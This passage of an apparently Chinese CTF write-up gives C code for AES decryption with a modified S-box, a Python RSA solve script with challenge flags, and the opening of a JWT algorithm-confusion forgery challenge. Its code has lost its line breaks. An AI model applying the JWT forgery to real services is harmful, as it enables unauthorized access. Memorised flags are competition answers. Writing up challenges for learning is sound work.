0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0x97, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16, 0x87&#125;;//逆S盒unsigned char inv_S[256] = &#123; 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D&#125;;/* copy in[16] to state[4][4] */int loadStateArray(uint8_t (*state)[4], const uint8_t *in) &#123; for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; state[j][i] = *in++; &#125; &#125; return 0;&#125;/* copy state[4][4] to out[16] */int storeStateArray(uint8_t (*state)[4], uint8_t *out) &#123; for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; *out++ = state[j][i]; &#125; &#125; return 0;&#125;//秘钥扩展int keyExpansion(const uint8_t *key, uint32_t keyLen, AesKey *aesKey) &#123; if (NULL == key || NULL == aesKey)&#123; printf(&quot;keyExpansion param is NULL\\n&quot;); return -1; &#125; if (keyLen != 16)&#123; printf(&quot;keyExpansion keyLen = %d, Not support.\\n&quot;, keyLen); return -1; &#125; uint32_t *w = aesKey-&gt;eK; //加密秘钥 uint32_t *v = aesKey-&gt;dK; //解密秘钥 /* keyLen is 16 Bytes, generate uint32_t W[44]. */ /* W[0-3] */ for (int i = 0; i &lt; 4; ++i) &#123; LOAD32H(w[i], key + 4*i); &#125; /* W[4-43] */ for (int i = 0; i &lt; 10; ++i) &#123; w[4] = w[0] ^ MIX(w[3]) ^ rcon[i]; w[5] = w[1] ^ w[4]; w[6] = w[2] ^ w[5]; w[7] = w[3] ^ w[6]; w += 4; &#125; w = aesKey-&gt;eK+44 - 4; //解密秘钥矩阵为加密秘钥矩阵的倒序，方便使用，把ek的11个矩阵倒序排列分配给dk作为解密秘钥 //即dk[0-3]=ek[41-44], dk[4-7]=ek[37-40]... dk[41-44]=ek[0-3] for (int j = 0; j &lt; 11; ++j) &#123; for (int i = 0; i &lt; 4; ++i) &#123; v[i] = w[i]; &#125; w -= 4; v += 4; &#125; return 0;&#125;// 轮秘钥加int addRoundKey(uint8_t (*state)[4], const uint32_t *key) &#123; uint8_t k[4][4]; /* i: row, j: col */ for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; k[i][j] = (uint8_t) BYTE(key[j], 3 - i); /* 把 uint32 key[4] 先转换为矩阵 uint8 k[4][4] */ state[i][j] ^= k[i][j]; &#125; &#125; return 0;&#125;//字节替换int subBytes(uint8_t (*state)[4]) &#123; /* i: row, j: col */ for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; state[i][j] = S[state[i][j]]; //直接使用原始字节作为S盒数据下标 &#125; &#125; return 0;&#125;//逆字节替换int invSubBytes(uint8_t (*state)[4]) &#123; /* i: row, j: col */ for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; state[i][j] = inv_S[state[i][j]]; &#125; &#125; return 0;&#125;//行移位int shiftRows(uint8_t (*state)[4]) &#123; uint32_t block[4] = &#123;0&#125;; /* i: row */ for (int i = 0; i &lt; 4; ++i) &#123; //便于行循环移位，先把一行4字节拼成uint_32结构，移位后再转成独立的4个字节uint8_t LOAD32H(block[i], state[i]); block[i] = ROF32(block[i], 8*i); STORE32H(block[i], state[i]); &#125; return 0;&#125;//逆行移位int invShiftRows(uint8_t (*state)[4]) &#123; uint32_t block[4] = &#123;0&#125;; /* i: row */ for (int i = 0; i &lt; 4; ++i) &#123; LOAD32H(block[i], state[i]); block[i] = ROR32(block[i], 8*i); STORE32H(block[i], state[i]); &#125; return 0;&#125;/* Galois Field (256) Multiplication of two Bytes */// 两字节的伽罗华域乘法运算uint8_t GMul(uint8_t u, uint8_t v) &#123; uint8_t p = 0; for (int i = 0; i &lt; 8; ++i) &#123; if (u &amp; 0x01) &#123; // p ^= v; &#125; int flag = (v &amp; 0x80); v &lt;&lt;= 1; if (flag) &#123; v ^= 0x1B; /* x^8 + x^4 + x^3 + x + 1 */ &#125; u &gt;&gt;= 1; &#125; return p;&#125;// 列混合int mixColumns(uint8_t (*state)[4]) &#123; uint8_t tmp[4][4]; uint8_t M[4][4] = &#123;&#123;0x02, 0x03, 0x01, 0x01&#125;, &#123;0x01, 0x02, 0x03, 0x01&#125;, &#123;0x01, 0x01, 0x02, 0x03&#125;, &#123;0x03, 0x01, 0x01, 0x02&#125;&#125;; /* copy state[4][4] to tmp[4][4] */ for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j)&#123; tmp[i][j] = state[i][j]; &#125; &#125; for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; //伽罗华域加法和乘法 state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j]) ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]); &#125; &#125; return 0;&#125;// 逆列混合int invMixColumns(uint8_t (*state)[4]) &#123; uint8_t tmp[4][4]; uint8_t M[4][4] = &#123;&#123;0x0E, 0x0B, 0x0D, 0x09&#125;, &#123;0x09, 0x0E, 0x0B, 0x0D&#125;, &#123;0x0D, 0x09, 0x0E, 0x0B&#125;, &#123;0x0B, 0x0D, 0x09, 0x0E&#125;&#125;; //使用列混合矩阵的逆矩阵 /* copy state[4][4] to tmp[4][4] */ for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j)&#123; tmp[i][j] = state[i][j]; &#125; &#125; for (int i = 0; i &lt; 4; ++i) &#123; for (int j = 0; j &lt; 4; ++j) &#123; state[i][j] = GMul(M[i][0], tmp[0][j]) ^ GMul(M[i][1], tmp[1][j]) ^ GMul(M[i][2], tmp[2][j]) ^ GMul(M[i][3], tmp[3][j]); &#125; &#125; return 0;&#125;// AES-128加密接口，输入key应为16字节长度，输入长度应该是16字节整倍数，// 这样输出长度与输入长度相同，函数调用外部为输出数据分配内存int aesEncrypt(const uint8_t *key, uint32_t keyLen, const uint8_t *pt, uint8_t *ct, uint32_t len) &#123; AesKey aesKey; uint8_t *pos = ct; const uint32_t *rk = aesKey.eK; //解密秘钥指针 uint8_t out[BLOCKSIZE] = &#123;0&#125;; uint8_t actualKey[16] = &#123;0&#125;; uint8_t state[4][4] = &#123;0&#125;; if (NULL == key || NULL == pt || NULL == ct)&#123; printf(&quot;param err.\\n&quot;); return -1; &#125; if (keyLen &gt; 16)&#123; printf(&quot;keyLen must be 16.\\n&quot;); return -1; &#125; if (len % BLOCKSIZE)&#123; printf(&quot;inLen is invalid.\\n&quot;); return -1; &#125; memcpy(actualKey, key, keyLen); keyExpansion(actualKey, 16, &amp;aesKey); // 秘钥扩展 // 使用ECB模式循环加密多个分组长度的数据 for (int i = 0; i &lt; len; i += BLOCKSIZE) &#123; // 把16字节的明文转换为4x4状态矩阵来进行处理 loadStateArray(state, pt); // 轮秘钥加 addRoundKey(state, rk); for (int j = 1; j &lt; 10; ++j) &#123; rk += 4; subBytes(state); // 字节替换 shiftRows(state); // 行移位 mixColumns(state); // 列混合 addRoundKey(state, rk); // 轮秘钥加 &#125; subBytes(state); // 字节替换 shiftRows(state); // 行移位 // 此处不进行列混合 addRoundKey(state, rk+4); // 轮秘钥加 // 把4x4状态矩阵转换为uint8_t一维数组输出保存 storeStateArray(state, pos); pos += BLOCKSIZE; // 加密数据内存指针移动到下一个分组 pt += BLOCKSIZE; // 明文数据指针移动到下一个分组 rk = aesKey.eK; // 恢复rk指针到秘钥初始位置 &#125; return 0;&#125;// AES128解密， 参数要求同加密int aesDecrypt(const uint8_t *key, uint32_t keyLen, const uint8_t *ct, uint8_t *pt, uint32_t len) &#123; AesKey aesKey; uint8_t *pos = pt; const uint32_t *rk = aesKey.dK; //解密秘钥指针 uint8_t out[BLOCKSIZE] = &#123;0&#125;; uint8_t actualKey[16] = &#123;0&#125;; uint8_t state[4][4] = &#123;0&#125;; if (NULL == key || NULL == ct || NULL == pt)&#123; printf(&quot;param err.\\n&quot;); return -1; &#125; if (keyLen &gt; 16)&#123; printf(&quot;keyLen must be 16.\\n&quot;); return -1; &#125; if (len % BLOCKSIZE)&#123; printf(&quot;inLen is invalid.\\n&quot;); return -1; &#125; memcpy(actualKey, key, keyLen); keyExpansion(actualKey, 16, &amp;aesKey); //秘钥扩展，同加密 for (int i = 0; i &lt; len; i += BLOCKSIZE) &#123; // 把16字节的密文转换为4x4状态矩阵来进行处理 loadStateArray(state, ct); // 轮秘钥加，同加密 addRoundKey(state, rk); for (int j = 1; j &lt; 10; ++j) &#123; rk += 4; invShiftRows(state); // 逆行移位 invSubBytes(state); // 逆字节替换，这两步顺序可以颠倒 addRoundKey(state, rk); // 轮秘钥加，同加密 invMixColumns(state); // 逆列混合 &#125; invSubBytes(state); // 逆字节替换 invShiftRows(state); // 逆行移位 // 此处没有逆列混合 addRoundKey(state, rk+4); // 轮秘钥加，同加密 storeStateArray(state, pos); // 保存明文数据 pos += BLOCKSIZE; // 输出数据内存指针移位分组长度 ct += BLOCKSIZE; // 输入数据内存指针移位分组长度 rk = aesKey.dK; // 恢复rk指针到秘钥初始位置 &#125; return 0;&#125;// 方便输出16进制数据void printHex(uint8_t *ptr, int len, char *tag) &#123; printf(&quot;%s\\ndata[%d]: &quot;, tag, len); for (int i = 0; i &lt; len; ++i) &#123; printf(&quot;%.2X &quot;, *ptr++); &#125; printf(&quot;\\n&quot;);&#125;int main() &#123; //S盒有变化,需要求出逆S盒 //unsigned char change_S[256] = &#123;&#125;; uint8_t line=0,rol=0; //位置 for(int i=0;i&lt;256;i++)&#123; line = (S[i]&amp;0xf0)&gt;&gt;4; rol = S[i]&amp;0xf; inv_S[line*16+rol] = i; &#125; const uint8_t key[16] = &#123;83, 89, 67, 76, 79, 86, 69, 82, 83, 89, 67, 76, 79, 86, 69, 82&#125;; //const uint8_t pt[16]=&#123;0x32, 0x43, 0xf6, 0xa8, 0x88, 0x5a, 0x30, 0x8d, 0x31, 0x31, 0x98, 0xa2, 0xe0, 0x37, 0x07, 0x34&#125;; uint8_t ct[32] = &#123;0x99, 0xE8, 0xB8, 0x01, 0xC8, 0x82, 0x51, 0x93, 0x12, 0xEE, 0x89, 0x64, 0xE7, 0xEF, 0x63, 0x8D, 0x51, 0xDF, 0x5D, 0x78, 0x39, 0xAA, 0x39, 0x62, 0xA0, 0xB4, 0x50, 0x30, 0x47, 0x30, 0x21, 0x06&#125;; // 外部申请输出数据内存，用于加密后的数据 uint8_t plain[32] = &#123;0&#125;; // 外部申请输出数据内存，用于解密后的数据 //aesEncrypt(key, 16, pt, ct, 16); // 加密 //printHex(pt, 16, &quot;plain data:&quot;); // 打印初始明文数据 //printHex(ct, 16, &quot;after encryption:&quot;); // 打印加密后的密文 aesDecrypt(key, 16, ct, plain, 32); // 解密 printHex(plain, 32, &quot;after decryption:&quot;); // 打印解密后的明文数据 return 0;&#125;// SYC&#123;B3l1eue_Th@t_y0u__l3aRn_Aes&#125; ​ Reverse/CryptoLinkedListModular 公司职员发现关键数据被加密了，请帮忙解密出来，注意e和phi。flag为输入的256长度的hex字符串的md5值，并包裹flag{}提交。该题需要一些逆向基础(C实现的程序，内含链表、gmp库相关)，可与队友联合解题，也可学习些二进制基础，对以后有益。 分析，key为 KnowYouLikeCrypto，生成的文件为异或key的结果，异或得到： 123456789101112131415cmp0p:0xae1e96a501b0360bd9ca423f2d9366e7c01c56e2d02dd20effc4c290e8bbd2cc53bb2a65b5262e254418d706335708ebd713cf9fac04fb1209d666adc6ebb6fee8c97a8dde4c23d3704198f918de46fe69a0d4d7878341c25118e7d1ac368753ce45f77b64580e0a89e300ac8f1be75d3a001df26bcfdaf82a479e14f6f25bfb q:0xcfc337e9217545d01babb00c330747aed4e6d99df42892bffce38e9b5c8a89d0528a7daac8d0075d72813669bc332688c9f6df2793b393580ac71f05db159e2dee3a6fd34ca2ba5ccae8428efefd6ee5454b6751ca71c008468278d7fe911e8c292172fa77468e996d80f4661c24ccdcc76c655a9168b0edeed165b2dd89501b e:0xd322 c:0x6f23dc633746ecd6f6b6c753556a969ded7f9033b7617d4497b3a3ac685b92063e42c5657a01604ed084035637440889bd6865449021a15dfa33ed2d9531f50c41d452df7399554a35f4340993d64c9e1c7b54894d291b33ac95b39719093d788a1d218f54f00494990f8aff3d09e21edae2172cd8b42ae6f8abfdb05e5d9a6ff4b5092f60f8ce2a576e429a80bd15fc7073d75415c824fc450a9295128e30804760179bc3213ade1121d615f7ebbf192f93dd25031de12e12e15ae189db525ddbdfb2f54f098c0a027b6b1277c22108dfd2699f7946ce51f1c73a78721896bd8baa3b7fa4dfc063ab212eb0684531f372f2edc7b1f7baa3353b55cc750b95ffcmp1p:0x7a7b8ee72d467eefe378502ca7804e0b55e0b68987dd7e8c03f7f7f717554183d2a0d99c7b33e8e1a28be171b77f8974616ac49645d7d5cf6fe5f4dcbfd1d25c3ad75e1eb3e4038d55a29c7114e176fd34626c2a8e76021d079cdb85cc8016acab00047910dfa5cd0439a3cc13527557ea879c184454a443711083a4f9d1d46b q:0xc17c7a7fbc5469af413f79c07cc5b892cfbbaa00950b115e267e83e2669f3f6779c7302ecfc9f850e0e4185892e96d356d65b1d372432c5a3f297cfb8373fe9a090a3f8dadf6ef6f2ca5b5107454ee6b1385d165bb4bb7776cbbccb8de1993a5ebb34ee365ff39b9ec9613121ba99d74759e0bf80726805ce03ed7f1e49375f1 e:0x10ae c:0x5be0df3bb240ffd53f2d914eb79878231821a1dba5cc491a888c8fd553a905a7f1cea2750c39ea48ab4175115591310c0f9d63e1aee9d2480780f3ce4f98c57114cd2901ea6f560e04a0a9cec157dac3def734fa10ab54c27bf20211cf1f1f6f6afe5fc9ef5c9af864f054a5e61c48c6e6dc087cc350008d4232d08b0b5011923f1077ead75d54a792aa8a51a0b37bfa3faef0b9380cff209c7bf3a20fbbb087caf177b83c9bf03e965bd7347dd18418f3e50aef29cc89fa594ccd31b6f63f397eeba71629fec2c8699148dfd6be32deb96577690814bb4fe6dbefe2379468e0e317a870795ba04ab2e306fe5340700c415048eff5909a2453752845572a0931cmp2p:0xa2562b53b1ff8b9635122c92612d8b6ea43ac0e40115c03befc0fb1bdefcda35a77f1cf23e5fdfa51ee864dac707524584cf4243cade36ea0b2ce14d9337d796f85b730483e7b6e342d44a36a1bc4052125b4eaef3724af9cfb8cab719d9efc54df851042408c2f69c1e5f46f00f067f7fa5cf7a3cb227879cbdefac7eab6cd3 q:0xfeec12d4602e4895f53715d7e5a7583ee93c49079480aadae13c7c9d720a5fd976b6b9ac5ef65570f9e9d9b6d0b0b39f1372ea819bc14cc10a0a23a7f22f60c1a4fc536ebc4997bb873db9d8cb34f58fec2a05dc766cb865e09aa6c1a059713ccb1b31a9c986ecd4f45dc53c95e32ae6d370ee3566daa8b5f5bf6fe5fa20cd0f e:0xc051 c:0xa798cb067b716ae1382d2070efb8bdb71050b88d9503a68fe5e851999071e4ee9f72c88b3975de09e8f436566d75f90e6388fddb3497b1e8f8f6bf8ad13cd35040d6b5b3f2e3ba3b1dddf14800840b0bfb08f25b5546cd5a34025e8eaaf289478c5f1b91229a31c980f773deb90cc0752da82aa17585bb616fc0b4f0749003a36f11acbdd4e85f7b092ee3864835c1063afccdbf3b585855a03e904cbc9c7fe9d86011a1237e396e4e2c72deec76829de7e67282cda86abd348bb98aac5ea83f3735c70a29f45cff6b4b76b03f12c4ea936368d13ba15a87da416a91be05ebaa0e67e1070e5d7a15f178c42ff05bab0e3de009f00b8e4cecf950f7250427e12cmp3p:0xb06c6c2ac320c555cc4bc5bc89976436582de33d77788ed0eb1e5b726e242c2890ede50d918d3b7cab74141519e43761f515590279fb4fa8674a94d0985aedfa4b54580307416aa1888015e12e2536350ffa418203161b5fb2438035160327e21f4015d4b7393d90fff50f8d5be3da08abefac23898a55dc60a24470c8fe76eb q:0xadabc61519e9642517eb5c2a4a416f34c62a2c1ea6ec4c1d0d4686a95c31dcabba2c13fa8217e14fc541857b846d88027a1f7cfee9aba0757c3a92ab579086586c0e52b8184de0c69ae674b034342b0db40955fbffdc84ee875b9b84f7d2bf32836f03c304b34fea2ea03731af95d9156b91a16ff9338fe8a9fce24525b65509 e:0xd2c2 c:0x11861752a8ca58b777300efbc8ed05ea54d0c326cbfb573a0bd21fe5a20191b03f07be7aea9ac192adbe48726a0a03ccc838375d7c4fcd0b8814578fad47ea0407281bbb205960c6453fff81584ce334a23960c6321c720da7b190281c6d46b55e3bab0493d8ff6cf3855a2a6039c259f955e2cbdfb9dcabc813ad82c5333d535950e28cfb2aa556c32700f64c2b63058cf33fe6c40677a93d8c80a0f9db60da1ce90182ed0aa6ed33a2a9288dc9ff19ed9bffb59991bddf282b38a59ded27f71c4e5e0190e5244d916556c033bb2a184c87cf1923fb87902fa9dbb5ad5f927249bedfa4b47e5a379297926e3216a808b93ea2c7bf014c0b7ae29eacf595a43e 解RSA： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from Crypto.Util.number import *from gmpy2 import *from hashlib import md5p1 = 0xae1e96a501b0360bd9ca423f2d9366e7c01c56e2d02dd20effc4c290e8bbd2cc53bb2a65b5262e254418d706335708ebd713cf9fac04fb1209d666adc6ebb6fee8c97a8dde4c23d3704198f918de46fe69a0d4d7878341c25118e7d1ac368753ce45f77b64580e0a89e300ac8f1be75d3a001df26bcfdaf82a479e14f6f25bfbq1 = 0xcfc337e9217545d01babb00c330747aed4e6d99df42892bffce38e9b5c8a89d0528a7daac8d0075d72813669bc332688c9f6df2793b393580ac71f05db159e2dee3a6fd34ca2ba5ccae8428efefd6ee5454b6751ca71c008468278d7fe911e8c292172fa77468e996d80f4661c24ccdcc76c655a9168b0edeed165b2dd89501be1 = 0xd322c1 = 0x6f23dc633746ecd6f6b6c753556a969ded7f9033b7617d4497b3a3ac685b92063e42c5657a01604ed084035637440889bd6865449021a15dfa33ed2d9531f50c41d452df7399554a35f4340993d64c9e1c7b54894d291b33ac95b39719093d788a1d218f54f00494990f8aff3d09e21edae2172cd8b42ae6f8abfdb05e5d9a6ff4b5092f60f8ce2a576e429a80bd15fc7073d75415c824fc450a9295128e30804760179bc3213ade1121d615f7ebbf192f93dd25031de12e12e15ae189db525ddbdfb2f54f098c0a027b6b1277c22108dfd2699f7946ce51f1c73a78721896bd8baa3b7fa4dfc063ab212eb0684531f372f2edc7b1f7baa3353b55cc750b95ffp2 = 0x7a7b8ee72d467eefe378502ca7804e0b55e0b68987dd7e8c03f7f7f717554183d2a0d99c7b33e8e1a28be171b77f8974616ac49645d7d5cf6fe5f4dcbfd1d25c3ad75e1eb3e4038d55a29c7114e176fd34626c2a8e76021d079cdb85cc8016acab00047910dfa5cd0439a3cc13527557ea879c184454a443711083a4f9d1d46bq2 = 0xc17c7a7fbc5469af413f79c07cc5b892cfbbaa00950b115e267e83e2669f3f6779c7302ecfc9f850e0e4185892e96d356d65b1d372432c5a3f297cfb8373fe9a090a3f8dadf6ef6f2ca5b5107454ee6b1385d165bb4bb7776cbbccb8de1993a5ebb34ee365ff39b9ec9613121ba99d74759e0bf80726805ce03ed7f1e49375f1e2 = 0x10aec2 = 0x5be0df3bb240ffd53f2d914eb79878231821a1dba5cc491a888c8fd553a905a7f1cea2750c39ea48ab4175115591310c0f9d63e1aee9d2480780f3ce4f98c57114cd2901ea6f560e04a0a9cec157dac3def734fa10ab54c27bf20211cf1f1f6f6afe5fc9ef5c9af864f054a5e61c48c6e6dc087cc350008d4232d08b0b5011923f1077ead75d54a792aa8a51a0b37bfa3faef0b9380cff209c7bf3a20fbbb087caf177b83c9bf03e965bd7347dd18418f3e50aef29cc89fa594ccd31b6f63f397eeba71629fec2c8699148dfd6be32deb96577690814bb4fe6dbefe2379468e0e317a870795ba04ab2e306fe5340700c415048eff5909a2453752845572a0931p3 = 0xa2562b53b1ff8b9635122c92612d8b6ea43ac0e40115c03befc0fb1bdefcda35a77f1cf23e5fdfa51ee864dac707524584cf4243cade36ea0b2ce14d9337d796f85b730483e7b6e342d44a36a1bc4052125b4eaef3724af9cfb8cab719d9efc54df851042408c2f69c1e5f46f00f067f7fa5cf7a3cb227879cbdefac7eab6cd3q3 = 0xfeec12d4602e4895f53715d7e5a7583ee93c49079480aadae13c7c9d720a5fd976b6b9ac5ef65570f9e9d9b6d0b0b39f1372ea819bc14cc10a0a23a7f22f60c1a4fc536ebc4997bb873db9d8cb34f58fec2a05dc766cb865e09aa6c1a059713ccb1b31a9c986ecd4f45dc53c95e32ae6d370ee3566daa8b5f5bf6fe5fa20cd0fe3 = 0xc051c3 = 0xa798cb067b716ae1382d2070efb8bdb71050b88d9503a68fe5e851999071e4ee9f72c88b3975de09e8f436566d75f90e6388fddb3497b1e8f8f6bf8ad13cd35040d6b5b3f2e3ba3b1dddf14800840b0bfb08f25b5546cd5a34025e8eaaf289478c5f1b91229a31c980f773deb90cc0752da82aa17585bb616fc0b4f0749003a36f11acbdd4e85f7b092ee3864835c1063afccdbf3b585855a03e904cbc9c7fe9d86011a1237e396e4e2c72deec76829de7e67282cda86abd348bb98aac5ea83f3735c70a29f45cff6b4b76b03f12c4ea936368d13ba15a87da416a91be05ebaa0e67e1070e5d7a15f178c42ff05bab0e3de009f00b8e4cecf950f7250427e12p4 = 0xb06c6c2ac320c555cc4bc5bc89976436582de33d77788ed0eb1e5b726e242c2890ede50d918d3b7cab74141519e43761f515590279fb4fa8674a94d0985aedfa4b54580307416aa1888015e12e2536350ffa418203161b5fb2438035160327e21f4015d4b7393d90fff50f8d5be3da08abefac23898a55dc60a24470c8fe76ebq4 = 0xadabc61519e9642517eb5c2a4a416f34c62a2c1ea6ec4c1d0d4686a95c31dcabba2c13fa8217e14fc541857b846d88027a1f7cfee9aba0757c3a92ab579086586c0e52b8184de0c69ae674b034342b0db40955fbffdc84ee875b9b84f7d2bf32836f03c304b34fea2ea03731af95d9156b91a16ff9338fe8a9fce24525b65509e4 = 0xd2c2c4 = 0x11861752a8ca58b777300efbc8ed05ea54d0c326cbfb573a0bd21fe5a20191b03f07be7aea9ac192adbe48726a0a03ccc838375d7c4fcd0b8814578fad47ea0407281bbb205960c6453fff81584ce334a23960c6321c720da7b190281c6d46b55e3bab0493d8ff6cf3855a2a6039c259f955e2cbdfb9dcabc813ad82c5333d535950e28cfb2aa556c32700f64c2b63058cf33fe6c40677a93d8c80a0f9db60da1ce90182ed0aa6ed33a2a9288dc9ff19ed9bffb59991bddf282b38a59ded27f71c4e5e0190e5244d916556c033bb2a184c87cf1923fb87902fa9dbb5ad5f927249bedfa4b47e5a379297926e3216a808b93ea2c7bf014c0b7ae29eacf595a43ef1 = (p1-1)*(q1-1)f2 = (p2-1)*(q2-1)f3 = (p3-1)*(q3-1)f4 = (p4-1)*(q4-1)print(gcd(e1,f1))print(gcd(e2,f2))print(gcd(e3,f3))print(gcd(e4,f4))# 1d1 = inverse(e1//2,f1)m1c = pow(c1,d1,p1*q1)m1 = gmpy2.iroot(mpz(m1c),mpz(2))[0]m1h = hex(m1)[2:]print(m1h)# 2d2 = inverse(e2//2,f2)m2c = pow(c2,d2,p2*q2)m2 = gmpy2.iroot(mpz(m2c),mpz(2))[0]m2h = hex(m2)[2:]print(m2h)# 3d3 = inverse(e3//3,f3)m3c = pow(c3,d3,p3*q3)m3 = gmpy2.iroot(mpz(m3c),mpz(3))[0]m3h = hex(m3)[2:]print(m3h)# 4d4 = inverse(e4//2,f4)m4c = pow(c4,d4,p4*q4)m4 = gmpy2.iroot(mpz(m4c),mpz(2))[0]m4h = hex(m4)[2:]print(m4h)flag = m1h+m2h+m3h+m4hh = md5(flag.encode()).hexdigest()print(f&#x27;flag&#123;&#123;&#123;h&#125;&#125;&#125;&#x27;)# 2# 2# 3# 2# 688682bc45a043f2e139153780fdd54af8517dd885464bdfa3dbcf776169255c# 9304306d542508c59abf30f99b98fefcd2951df2effc81fca8e5aa26414819cb# 144576b4302a8c5262d7d4d9b2ebb3468835c709cc88fc0b8b38b52a6f31d3ab# 6b25edeccfcf74f0dfc77abc90d757a49c1d0fb1c90e67db7918c61be80ad59c# flag&#123;d3f06717efc6c0daf454ffeac9764687&#125; ​ Crypto/Webjwt_pickle jwt和pickle,做就完事了OUO 代码审计，发现jwt使用RS256加密，且使用RS256或HS256解密。 参考：2024网鼎杯初赛-青龙组-WEB01 先生成两个token，然后利用rsa_sign2n工具来生成公钥： 123456789101112131415161718192021222324252627282930python3 jwt_forgery.py 